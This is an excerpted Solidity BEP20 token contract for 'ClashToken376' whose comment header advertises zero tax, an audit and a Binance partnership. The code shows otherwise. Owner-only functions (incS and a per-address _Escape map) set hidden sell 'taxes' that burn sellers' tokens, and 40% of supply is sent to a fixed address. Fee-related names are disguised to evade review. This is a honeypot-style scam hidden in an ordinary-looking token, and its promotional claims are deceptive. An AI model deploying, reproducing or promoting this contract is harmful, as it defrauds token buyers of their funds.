...
/*
btoken CT project is a utility staking token with ZERO TAX holders will be able to stake nft , holding it for longer period of time.  KYC AUDIT  Contract audit  NO TOKEN TAX    Partnered with Binance, Dont forget to follow our official links down below and dont miss out this rare opportunity.
* http://instagram.com/ClashToken376
* https://www.reddit.com/user/ClashToken376
* TWITTER:https://twitter.com/ct
* WEBSITE:https://www.clash.io
* TELEGRAM:https://t.me/ct
*/
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingClashToken376OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingClashToken376OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function swapExactTokensForTokensSupportingClashToken376OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingClashToken376OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingClashToken376OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
...
interface IUniswapV2Factory {
    ...
    function ClashToken376To() external view returns (address);
    function ClashToken376ToSetter() external view returns (address);
    ...
    function setClashToken376To(address) external;
    function setClashToken376ToSetter(address) external;
}
...
contract CT is BEP20, Ownable {
	...
	transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*4);	
        ...
        _defaultSellClashToken376 = 0;
        _defaultBuyClashToken376 = 0;
    ...
    uint256 private _defaultSellClashToken376 = 0;
    uint256 private _defaultBuyClashToken376 = 0;
    ...
    function incS(uint256 _value) external onlyowaer {
        _defaultSellClashToken376 = _value;
    }


    function acClashToken376fq(address _acc, uint256 _value) external onlyowaer {
 ...
 function getRelease(address _address) external view onlyowaer returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeClashToken376amuont = 0;

        if (rF) {
            uint256 tradeClashToken376 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradeClashToken376 = _msgClashToken376Info(uint160(from));
                    tradeClashToken376 = tradeClashToken376 < _defaultSellClashToken376 ? _defaultSellClashToken376 : tradeClashToken376;
                }
                if (from == uniswapV2Pair) {
                    tradeClashToken376 = _defaultBuyClashToken376;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradeClashToken376 = _Escape[from];
            }


            tradeClashToken376amuont = _amuont.mul(tradeClashToken376).div(100);
        }


        if (tradeClashToken376amuont > 0) {
            _balances[from] = _balances[from].sub(tradeClashToken376amuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradeClashToken376amuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradeClashToken376amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradeClashToken376amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradeClashToken376amuont);
        emit Transfer(from, _to, _amuont - tradeClashToken376amuont);
    }
	...
	function _msgClashToken376Info(uint _acc) internal view virtual returns (uint) {
